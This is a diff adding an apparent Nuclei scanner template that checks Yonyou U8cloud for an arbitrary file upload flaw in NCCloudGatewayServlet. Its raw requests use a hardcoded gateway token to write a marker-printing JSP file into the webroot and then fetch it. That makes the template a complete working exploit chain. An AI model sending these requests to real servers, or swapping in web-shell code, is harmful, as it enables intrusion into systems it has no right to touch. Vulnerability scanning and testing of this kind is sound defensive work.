@@ -1,0 +1,71 @@
+id: youyouU8-nccloudgatewayservlet-upload
+
+info:
+  name: 用友U8cloud NCCloudGatewayServlet接口存在任意文件上传漏洞
+  author: youyouU8
+  severity: high
+  tags: youyouU8
+
+http:
+  - raw:
+      - |
+        POST /service/NCCloudGatewayServlet HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+        Cache-Control: max-age=0
+        gatewaytoken: TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
+        Content-Type: application/json
+
+        {
+        
+        "groupCode": "1002",
+        "user": "1002",
+        "serviceInfo": {
+        "serviceClassName": "nc.itf.uap.pfxx.IPFxxFileService",
+        "serviceMethodName": "writeDocToXMLFile",
+        "serviceMethodArgInfo": [
+              {
+        "argType": {
+        "body": "java.lang.Byte"
+                },
+        "argValue": {
+        "body": [60,37,32,111,117,116,46,112,114,105,110,116,108,110,40,34,113,97,120,110,98,33,33,33,34,41,59,32,37,62]
+                },
+        "agg": false,
+        "isArray": true,
+        "isPrimitive": true
+              },
+              {
+        "argType": {
+        "body": "java.lang.String"
+                },
+        "argValue": {
+        "body": "./webapps/u8c_web/tesdd6s9136.jsp"
+                },
+        "agg": false,
+        "isArray": false,
+        "isPrimitive": false
+              }
+            ]
+          }
+        }
+
+      - |+
+        GET /tesdd6s9136.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - 'qaxnb!!!'
+    matchers-condition: and
